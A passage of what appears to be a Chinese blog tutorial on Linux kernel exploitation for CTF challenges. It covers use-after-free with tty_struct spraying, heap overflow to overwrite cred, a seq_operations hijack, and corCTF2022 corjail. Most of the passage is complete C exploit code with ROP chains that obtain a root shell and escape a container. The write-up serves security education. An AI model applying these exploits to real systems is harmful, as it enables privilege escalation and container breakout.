class="number">0x100</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    bind_cpu(sched_getcpu());</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> bof_fd = open(<span class="string">&quot;/dev/bof&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (bof_fd == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] open bof device failed!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">param</span> <span class="title">p</span>;</span></span><br><span class="line">    p.buf = <span class="built_in">malloc</span>(p.len = <span class="number">0x2e0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 让驱动分配 BOF_NUM 个 0x2e0  的内存块</span></span><br><span class="line">    <span class="keyword">for</span> (p.idx = BOF_NUM - <span class="number">1</span>; p.idx &gt;= <span class="number">0</span>; p.idx--) &#123;</span><br><span class="line">        ioctl(bof_fd, <span class="number">5</span>, &amp;p); <span class="comment">// malloc</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 释放 BOF_NUM 个申请的内存块</span></span><br><span class="line">    <span class="keyword">for</span> (p.idx = BOF_NUM - <span class="number">1</span>; p.idx &gt;= <span class="number">0</span>; p.idx--) &#123;</span><br><span class="line">        ioctl(bof_fd, <span class="number">7</span>, &amp;p);  <span class="comment">// free</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 批量 open /dev/ptmx, 喷射 tty_struct</span></span><br><span class="line">    <span class="type">int</span> ptmx_fds[PTMX_NUM];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PTMX_NUM; ++i) &#123;</span><br><span class="line">        ptmx_fds[i] = open(<span class="string">&quot;/dev/ptmx&quot;</span>, O_RDWR | O_NOCTTY);</span><br><span class="line">        <span class="keyword">if</span> (ptmx_fds[i] == <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[-] open ptmx err&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    p.idx = <span class="number">0</span>;</span><br><span class="line">    ioctl(bof_fd, <span class="number">9</span>, &amp;p);</span><br><span class="line">    <span class="comment">// 此时如果释放后的内存被 tty_struct 占用，那么他的开始字节序列应该为 1 54  0  0  1  0  0  0  0  0  0  0  0  0  0  0</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; ++i) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%2x%c&quot;</span>, p.buf[i], i == <span class="number">15</span> ? <span class="string">&#x27;\n&#x27;</span> : <span class="string">&#x27; &#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 利用 tty_operations 指针泄露内核基址</span></span><br><span class="line">    <span class="type">size_t</span> offset = (*(<span class="type">size_t</span> *) &amp;p.buf[<span class="number">0x18</span>]) - <span class="number">0xffffffff81a87940</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] offset: %p\n&quot;</span>, offset);</span><br><span class="line">    commit_creds = (<span class="type">void</span> *) ((<span class="type">size_t</span>) commit_creds + offset);</span><br><span class="line">    prepare_kernel_cred = (<span class="type">void</span> *) ((<span class="type">size_t</span>) prepare_kernel_cred + offset);</span><br><span class="line">    pop_rdi_ret += offset;</span><br><span class="line">    mov_cr4_rdi_pop_rbp_ret += offset;</span><br><span class="line">    swapgs_pop_rbp_ret += offset;</span><br><span class="line">    iretq += offset;</span><br><span class="line">    xchg_eax_esp_ret += offset;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 伪造 tty_operations 结构体</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> *<span class="title">fake_tty_operations</span> =</span> (<span class="keyword">struct</span> tty_operations *) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> tty_operations));</span><br><span class="line">    <span class="built_in">memset</span>(fake_tty_operations, <span class="number">0</span>, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> tty_operations));</span><br><span class="line">    fake_tty_operations-&gt;ioctl = (<span class="type">void</span> *) xchg_eax_esp_ret;</span><br><span class="line">    fake_tty_operations-&gt;close = (<span class="type">void</span> *) xchg_eax_esp_ret;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 布局 rop 链</span></span><br><span class="line">    save_status();</span><br><span class="line">    <span class="type">size_t</span> rop_chain[] = &#123;</span><br><span class="line">            pop_rdi_ret,</span><br><span class="line">            <span class="number">0x6f0</span>,</span><br><span class="line">            mov_cr4_rdi_pop_rbp_ret,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            (<span class="type">size_t</span>) get_root,</span><br><span class="line">            swapgs_pop_rbp_ret,</span><br><span class="line">            <span class="number">0</span>,<span class="comment">//padding</span></span><br><span class="line">            iretq,</span><br><span class="line">            (<span class="type">size_t</span>) get_shell,</span><br><span class="line">            user_cs,</span><br><span class="line">            user_rflags,</span><br><span class="line">            user_sp,</span><br><span class="line">            user_ss</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 触发漏洞前先把 rop 链拷贝到 mmap_base</span></span><br><span class="line">    <span class="type">void</span> *mmap_base = (<span class="type">void</span> *) (xchg_eax_esp_ret &amp; <span class="number">0xffffffff</span>);</span><br><span class="line">    <span class="type">void</span> *mmap_addr = mmap(mmap_base - <span class="number">0x1000</span>, <span class="number">0x30000</span>, <span class="number">7</span>, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] mmap_addr: %p\n&quot;</span>, mmap_addr);</span><br><span class="line">    <span class="built_in">memset</span>(mmap_addr, <span class="number">0</span>, <span class="number">0x30000</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(mmap_base, rop_chain, <span class="keyword">sizeof</span>(rop_chain));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 批量修改 tty_struct 的 ops 指针</span></span><br><span class="line">    *(<span class="type">size_t</span> *) &amp;p.buf[<span class="number">0x18</span>] = (<span class="type">size_t</span>) fake_tty_operations;</span><br><span class="line">    <span class="keyword">for</span> (p.idx = <span class="number">0</span>; p.idx &lt; BOF_NUM; p.idx++) &#123;</span><br><span class="line">        ioctl(bof_fd, <span class="number">8</span>, &amp;p);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用 tty_operations.ioctl 和 tty_operations.close 触发漏洞</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PTMX_NUM; ++i) &#123;</span><br><span class="line">        ioctl(ptmx_fds[i], <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">        close(ptmx_fds[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h2 id="heap-overflow">Heap Overflow</h2>
<h3 id="修改-cred-1">修改 cred</h3>
<p>溢出修改 <code>cred</code> ，和前面 UAF 修改 <code>cred</code>
一样，在新版本失效。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">param</span> &#123;</span></span><br><span class="line">    <span class="type">size_t</span> len;    <span class="comment">// 内容长度</span></span><br><span class="line">    <span class="type">char</span> *buf;     <span class="comment">// 用户态缓冲区地址</span></span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> idx; <span class="comment">// 表示 ptr 数组的 索引</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> BOF_NUM = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="type">int</span> bof_fd = open(<span class="string">&quot;/dev/bof&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (bof_fd == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] Failed to open bof device.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">param</span> <span class="title">p</span> =</span> &#123;<span class="number">0xa8</span>, <span class="built_in">malloc</span>(<span class="number">0xa8</span>), <span class="number">0</span>&#125;;</span><br><span class="line">    <span class="comment">// 让驱动分配 80 个 0xa8  的内存块</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">80</span>; i++) &#123;</span><br><span class="line">        ioctl(bof_fd, <span class="number">5</span>, &amp;p);  <span class="comment">// malloc</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] clear heap done&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 让驱动分配 10 个 0xa8  的内存块</span></span><br><span class="line">    <span class="keyword">for</span> (p.idx = <span class="number">0</span>; p.idx &lt; BOF_NUM; p.idx++) &#123;</span><br><span class="line">        ioctl(bof_fd, <span class="number">5</span>, &amp;p);  <span class="comment">// malloc</span></span><br><span class="line">    &#125;</span><br><span class="line">    p.idx = <span class="number">5</span>;</span><br><span class="line">    ioctl(bof_fd, <span class="number">7</span>, &amp;p); <span class="comment">// free</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用 fork 分配一个 cred结构体</span></span><br><span class="line">    <span class="type">int</span> pid = fork();</span><br><span class="line">    <span class="keyword">if</span> (pid &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] fork error&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 此时 ptr[4] 和 cred相邻</span></span><br><span class="line">    <span class="comment">// 溢出 修改 cred 实现提权</span></span><br><span class="line">    p.idx = <span class="number">4</span>, p.len = <span class="number">0xc0</span> + <span class="number">0x30</span>;</span><br><span class="line">    <span class="built_in">memset</span>(p.buf, <span class="number">0</span>, p.len);</span><br><span class="line">    ioctl(bof_fd, <span class="number">8</span>, &amp;p);</span><br><span class="line">    <span class="keyword">if</span> (!pid) &#123;</span><br><span class="line">        <span class="comment">//一直到egid及其之前的都变为了0，这个时候就已经会被认为是root了</span></span><br><span class="line">        <span class="type">size_t</span> uid = getuid();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] uid: %zx\n&quot;</span>, uid);</span><br><span class="line">        <span class="keyword">if</span> (!uid) &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[+] root success&quot;</span>);</span><br><span class="line">            <span class="comment">// 权限修改完毕，启动一个shell，就是root的shell了</span></span><br><span class="line">            system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[-] root fail&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        wait(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h3 id="堆溢出-堆喷射覆写-seq_operations-控制内核执行流">堆溢出 +
堆喷射覆写 seq_operations 控制内核执行流</h3>
<p>原题为 <a class="link" 
 href="https://gitcode.net/qq_45323960/attachment/-/tree/master/linux_kernel_pwn/InCTF2021_kqueue" >InCTF2021
- Kqueue <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> ，这里简化分析过程用 heap_bof 代替。</p>
<p><code>seq_operations</code> 结构如下，该结构在打开
<code>/proc/self/stat</code> 时从 <code>kmalloc-32</code> 中分配。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seq_operations</span> &#123;</span></span><br><span class="line">	<span class="type">void</span> * (*start) (<span class="keyword">struct</span> seq_file *m, <span class="type">loff_t</span> *pos);</span><br><span class="line">	<span class="type">void</span> (*stop) (<span class="keyword">struct</span> seq_file *m, <span class="type">void</span> *v);</span><br><span class="line">	<span class="type">void</span> * (*next) (<span class="keyword">struct</span> seq_file *m, <span class="type">void</span> *v, <span class="type">loff_t</span> *pos);</span><br><span class="line">	<span class="type">int</span> (*show) (<span class="keyword">struct</span> seq_file *m, <span class="type">void</span> *v);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
<p>在调用读取 <code>stat</code> 文件时会调用 <code>seq_operations</code>
的 <code>start</code> 函数指针。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">seq_read</span><span class="params">(<span class="keyword">struct</span> file *file, <span class="type">char</span> __user *buf, <span class="type">size_t</span> size, <span class="type">loff_t</span> *ppos)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">seq_file</span> *<span class="title">m</span> =</span> file-&gt;private_data;</span><br><span class="line">	...</span><br><span class="line">	p = m-&gt;op-&gt;start(m, &amp;pos);</span><br><span class="line">	...</span><br></pre></td></tr></table></figure></div>
<p>当我们在 <code>heap_bof</code> 驱动分配 <code>0x20</code> 大小的
object 后打开大量的 <code>stat</code> 文件就有很大概率在
<code>heap_bof</code> 分配的 object 的溢出范围内存在
<code>seq_operations</code> 结构体。</p>
<p>由于这道题关闭了 SMEP，SMAP 和 KPTI 保护，因此我们可以覆盖
<code>start</code> 函数指针为用户空间的提权代码实现提权。</p>
<p>至于 KASLR 可以通过泄露栈上的数据绕过。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/ed66e47890686c2643ac0875e684fc6e.png"
                     
alt="在这里插入图片描述" 
                ></p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">param</span> &#123;</span></span><br><span class="line">    <span class="type">size_t</span> len;       <span class="comment">// 内容长度</span></span><br><span class="line">    <span class="type">char</span> *buf;        <span class="comment">// 用户态缓冲区地址</span></span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> idx;<span class="comment">// 表示 ptr 数组的 索引</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> SEQ_NUM = <span class="number">0x200</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> DATA_SIZE = <span class="number">0x20</span> * <span class="number">8</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_shell</span><span class="params">()</span> &#123; system(<span class="string">&quot;/bin/sh&quot;</span>); &#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_rflags, user_sp, user_ss, user_rip = (<span class="type">size_t</span>) get_shell;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span> &#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KERNCALL __attribute__((regparm(3)))</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *(*commit_creds)(<span class="type">void</span> *) KERNCALL = (<span class="type">void</span> *) <span class="number">0xFFFFFFFF810A1340</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *init_cred = (<span class="type">void</span> *) <span class="number">0xFFFFFFFF81E496C0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> kernel_offset;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_root</span><span class="params">()</span> &#123;</span><br><span class="line">    __asm__(</span><br><span class="line">            <span class="string">&quot;mov rax, [rsp + 8];&quot;</span></span><br><span class="line">            <span class="string">&quot;mov kernel_offset, rax;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    kernel_offset -= <span class="number">0xffffffff81229378</span>;</span><br><span class="line">    commit_creds = (<span class="type">void</span> *) ((<span class="type">size_t</span>) commit_creds + kernel_offset);</span><br><span class="line">    init_cred = (<span class="type">void</span> *) ((<span class="type">size_t</span>) init_cred + kernel_offset);</span><br><span class="line">    commit_creds(init_cred);</span><br><span class="line">    __asm__(</span><br><span class="line">            <span class="string">&quot;swapgs;&quot;</span></span><br><span class="line">            <span class="string">&quot;push user_ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;push user_sp;&quot;</span></span><br><span class="line">            <span class="string">&quot;push user_rflags;&quot;</span></span><br><span class="line">            <span class="string">&quot;push user_cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;push user_rip;&quot;</span></span><br><span class="line">            <span class="string">&quot;iretq;&quot;</span></span><br><span class="line">            );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> bof_fd = open(<span class="string">&quot;dev/bof&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (bof_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] Failed to open bof.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">param</span> <span class="title">p</span> =</span> &#123;<span class="number">0x20</span>, <span class="built_in">malloc</span>(<span class="number">0x20</span>), <span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x40</span>; i++) &#123;</span><br><span class="line">        ioctl(bof_fd, <span class="number">5</span>, &amp;p);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> seq_fd[SEQ_NUM];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; SEQ_NUM; i++) &#123;</span><br><span class="line">        seq_fd[i] = open(<span class="string">&quot;/proc/self/stat&quot;</span>, O_RDONLY);</span><br><span class="line">        <span class="keyword">if</span> (seq_fd[i] &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[-] Failed to open stat.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] seq_operations spray finished.&quot;</span>);</span><br><span class="line"></span><br><span class="line">    p.len = DATA_SIZE;</span><br><span class="line">    p.buf = <span class="built_in">malloc</span>(DATA_SIZE);</span><br><span class="line">    p.idx = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; DATA_SIZE; i += <span class="keyword">sizeof</span>(<span class="type">size_t</span>)) &#123;</span><br><span class="line">        *(<span class="type">size_t</span> *) &amp;p.buf[i] = (<span class="type">size_t</span>) get_root;</span><br><span class="line">    &#125;</span><br><span class="line">    ioctl(bof_fd, <span class="number">8</span>, &amp;p);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Heap overflow finished.&quot;</span>);</span><br><span class="line"></span><br><span class="line">    save_status();</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; SEQ_NUM; i++) &#123;</span><br><span class="line">        read(seq_fd[i], p.buf, <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h2 id="off-by-null">Off By Null</h2>
<h3 id="例题corctf2022-corjailkmalloc-4k">例题：corCTF2022
corjail（kmalloc-4k）</h3>
<p>这里以 <a class="link" 
 href="https://gitcode.net/qq_45323960/attachment/-/tree/master/linux_kernel_pwn/corCTF2022-corjail" >corCTF
2022 corjail <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 为例进行讲解。</p>
<p>题目驱动存在 0x1000 大小 object 的 off by one 漏洞。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">v7 = (<span class="type">char</span> *)kmem_cache_alloc_trace(kmalloc_caches[<span class="number">12</span>], <span class="number">0xA20</span>LL, <span class="number">0x1000</span>LL);</span><br><span class="line">printk(<span class="string">&quot;\x016[CoRMon::Debug] Syscalls @ %#llx\n&quot;</span>, v7);</span><br><span class="line"><span class="keyword">if</span> ( v7 )</span><br><span class="line">&#123;</span><br><span class="line">  _check_object_size(v7, v5, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( copy_from_user(v7, a2, v5) )</span><br><span class="line">  &#123;</span><br><span class="line">    printk(<span class="string">&quot;\x013[CoRMon::Error] copy_from_user() call failed!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-14LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v7[v5] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)update_filter(v7) )</span><br><span class="line">    &#123;</span><br><span class="line">      kfree(v7);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-22LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      kfree(v7);</span><br><span class="line">      <span class="keyword">return</span> a3;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></div>
<p>首先喷射大量 0x20 大小的 <code>user_key_payload</code> 和下图所示
0x1000 + 0x20 的 <code>poll_list</code> 。</p>
<figure>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/99a7506313bfd15e5f0821cc7486cfb9.png"
                      alt="img" 
                >
<figcaption aria-hidden="true">img</figcaption>
</figure>
<p>此时内存中 object 的分布如下图所示，其中黄色的是
<code>user_key_payload</code> ，绿色的是 <code>poll_list</code>
，白色是空闲 object 。</p>
<figure>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/26f0aa72bd11390b7b9790c1fa7cffe9.png"
                      alt="img" 
                >
<figcaption aria-hidden="true">img</figcaption>
</figure>
<p>通过 off by null 修改 0x1000 大小的 <code>poll_list</code> ，使得指向
0x20 大小 <code>poll_list</code> 的 <code>next</code> 指针指向
<code>user_key_payload</code> 。</p>
<p>之后释放所有的 <code>poll_list</code> 结构，被 <code>next</code>
指向的的 <code>user_key_payload</code> 也被释放，形成 UAF
。注意，为了确保释放 <code>poll_list</code> 不出错，要保证
<code>0x20</code> 大小的 <code>poll_list</code> 的 <code>next</code>
指针为 NULL 。也就是 <code>user_key_payload</code> 的前 8 字节为 NULL
。由于 <code>user_key_payload</code> 的前 8
字节没有初始化，因此可以在申请 <code>user_key_payload</code> 前先用
<code>setxattr</code> 把前 8 字节置为 NULL 。另外实测 kmalloc-32 的
freelist 偏移为 16 字节，不会覆盖 <code>next</code> 指针。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/64bfe90cc041bac53218ddde26656a27.png"
                      
                ></p>
<p>喷射 <code>seq_operations</code> 利用
<code>seq_operations-&gt;next</code> 的低四字节覆盖
<code>user_key_payload-&gt;datalen</code> 为 0x4370 实现
<code>user_key_payload</code> 越界读，
<code>user_key_payload-&gt;data</code> 前 8 字节被覆盖为
<code>seq_operations-&gt;show</code>
，可以泄露内核基址。另外可以根据是否越界读判断该
<code>user_key_payload</code> 是否被 <code>seq_operations</code>
覆盖。</p>
<p>之后释放不能越界读的 <code>user_key_payload</code> 并喷射
<code>tty_file_private</code> 填充产生的空闲 object 。之后再次越界读泄露
<code>tty_file_private-&gt;tty</code> 指向的 <code>tty_struct</code>
，我们定义这个地址为 <code>target_object</code> 。</p>
<figure>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/7c7268c0160ec64d50ada5c1787f789f.png"
                      alt="img" 
                >
<figcaption aria-hidden="true">img</figcaption>
</figure>
<p>释放 <code>seq_operations</code> 喷射 0x20 大小的
<code>poll_list</code> 。在 <code>poll_list</code> 被释放前，释放劫持的
<code>user_key_payload</code> ，利用 <code>setxattr</code> 修改
<code>poll_list</code> 的 <code>next</code> 指针指向
<code>target_object - 0x18</code> 。为了实现 <code>setxattr</code>
的喷射效果，<code>setxattr</code> 修改过的 object 通过申请
<code>user_key_payload</code> 劫持，确保下次 <code>setxattr</code>
修改的是另外的 object 。</p>
<figure>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/18766f6b9f8a4dd92bab29f062fa6a7a.png"
                      alt="img" 
                >
<figcaption aria-hidden="true">img</figcaption>
</figure>
<p>趁 <code>poll_list</code> 还没有释放，释放 <code>tty_struct</code>
并申请 <code>pipe_buffer</code> ，将 <code>target_object</code> 替换为
<code>pipe_buffer</code> 。</p>
<p>之后 <code>poll_list</code> 释放导致
<code>target_object - 0x18</code> 区域释放。我们可以申请一个 0x400
大小的 <code>user_key_payload</code> 劫持
<code>target_object - 0x18</code> ，从而劫持 <code>pipe_buffer</code>
实现控制流劫持。</p>
<figure>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/18a655483165c8fc681c3e8dbf16c645.png"
                      alt="img" 
                >
<figcaption aria-hidden="true">img</figcaption>
</figure>
<p>本题除了内核提权外还需要 Docket 逃逸，具体实现为修改
<code>task_struct</code> 的 <code>fs</code> 指向 <code>init_fs</code>
。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// commit_creds(&amp;init_creds)</span></span><br><span class="line">*rop++ = pop_rdi_ret;</span><br><span class="line">*rop++ = init_cred;</span><br><span class="line">*rop++ = commit_creds;</span><br><span class="line"></span><br><span class="line"><span class="comment">// current = find_task_by_vpid(getpid())</span></span><br><span class="line">*rop++ = pop_rdi_ret;</span><br><span class="line">*rop++ = getpid();</span><br><span class="line">*rop++ = find_task_by_vpid;</span><br><span class="line"></span><br><span class="line"><span class="comment">// current-&gt;fs = &amp;init_fs</span></span><br><span class="line">*rop++ = pop_rcx_ret;</span><br><span class="line">*rop++ = <span class="number">0x6e0</span>;</span><br><span class="line">*rop++ = add_rax_rcx_ret;</span><br><span class="line">*rop++ = pop_rbx_ret;</span><br><span class="line">*rop++ = init_fs;</span><br><span class="line">*rop++ = mov_mmrax_rbx_pop_rbx_ret;</span><br><span class="line">rop++;</span><br></pre></td></tr></table></figure></div>
<p>利用不是很稳定，不过多次尝试还是能打通的。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/d4f849b628584d52f3a8f6b1c01f3f07.png"
                     
alt="在这里插入图片描述" 
                > 由于题目环境存在 <code>curl</code>
